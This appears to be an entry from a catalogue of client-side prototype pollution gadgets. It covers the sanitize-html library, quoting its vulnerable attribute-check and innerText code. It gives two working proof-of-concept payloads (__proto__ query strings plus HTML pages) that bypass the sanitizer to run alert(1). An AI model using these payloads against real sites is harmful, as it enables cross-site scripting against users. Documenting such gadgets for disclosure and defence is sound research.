## sanitize-html

URL: https://github.com/apostrophecms/sanitize-html

### JS Fingerprint
```
return (typeof sanitizeHtml !== 'undefined')
```

### Vulnerable code fragment
https://github.com/apostrophecms/sanitize-html/blob/d78ee44069b3a3bb70aca3289de63b7acbffd4f2/index.js#L275-L280
```js
          if (!allowedAttributesMap ||
            (has(allowedAttributesMap, name) && allowedAttributesMap[name].indexOf(a) !== -1) ||
            (allowedAttributesMap['*'] && allowedAttributesMap['*'].indexOf(a) !== -1) ||
            (has(allowedAttributesGlobMap, name) && allowedAttributesGlobMap[name].test(a)) ||
            (allowedAttributesGlobMap['*'] && allowedAttributesGlobMap['*'].test(a))) {
            passedAllowedAttributesMapCheck = true;
```

https://github.com/apostrophecms/sanitize-html/blob/4c229fbbc9c269236b571dcbf834dc7c0ea19012/index.js#L194-L196
```js
        result += ">";
        if (frame.innerText && !hasText && !options.textFilter) {
          result += frame.innerText;
        }
```

### PoC

#### PoC #1

```
?__proto__[*][]=onload
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
<script>
  Object.prototype['*'] = ['onload']
</script>
<script>
  document.write(sanitizeHtml('<iframe onload=alert(1)>'))
</script>
```

#### PoC #2

```
?__proto__[innerText]=<script>alert(1)</script>
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
<script>
  Object.prototype.innerText = "<script>alert(1)<\/script>"
</script>
<script>
  document.write(sanitizeHtml('<a>'))
</script>
```